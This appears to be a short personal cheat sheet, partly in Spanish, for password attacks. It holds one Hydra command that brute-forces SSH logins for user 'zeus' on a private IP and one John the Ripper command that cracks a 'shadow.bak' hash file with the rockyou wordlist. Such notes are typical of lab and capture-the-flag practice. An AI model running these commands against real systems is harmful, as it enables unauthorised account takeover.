## FORCE BRUTE

### HYDRA

Fuerza bruta ssh
<pre>
hydra -l zeus -P passwords.txt ssh://192.168.168.225
</pre>

### JOHN

<pre>
john -w:/usr/share/wordlists/rockyou.txt shadow.bak
</pre>
